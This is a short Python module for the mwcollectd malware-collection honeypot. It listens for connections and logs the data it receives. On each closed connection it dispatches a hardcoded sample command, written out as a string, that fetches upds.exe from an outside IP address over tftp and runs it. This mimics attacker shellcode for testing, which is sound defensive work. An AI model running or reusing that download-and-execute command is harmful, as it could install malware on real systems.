from mwcollectd import *
import mwcollectd
import sys
import struct

class SmbConnection(NetworkEndpoint):
	def connectionEstablished(self):
		self.timeouts.sustain = 5
		log(L_INFO, 'New connection, timeout after %is idle time.' % self.timeouts.sustain)

	def connectionClosed(self):
		dispatchEvent('shellcode.process', { 'commandline': 'tftp.exe -i 88.84.18.105 get upds.exe && upds.exe', 'recorder': self.getRecorder() } )

		log(L_INFO, 'Connection has been closed.')

	def dataRead(self, buf):
		log(L_SPAM, buf.decode('latin1').replace('\r\n', '').replace('\n', ''))


class DebugEventHandler:
	def __init__(self, name, event):
		log(L_SPAM, '%s: %s' % (name, repr(event)))


def start(config):
	if config:
		pass
	else:
		log(L_INFO, 'Example Python module loaded with no configuration!')

	log(L_INFO, mwcollectd.version)

	global smb_server
	smb_server = NetworkServer(('any', 1337), SmbConnection)

	global process_handler

	process_handler = EventSubscription('shellcode.process', DebugEventHandler)
	process_handler.register()


	return True


def stop():
	global smb_server
	smb_server.close()

	global process_handler
	process_handler.unregister()

	return True
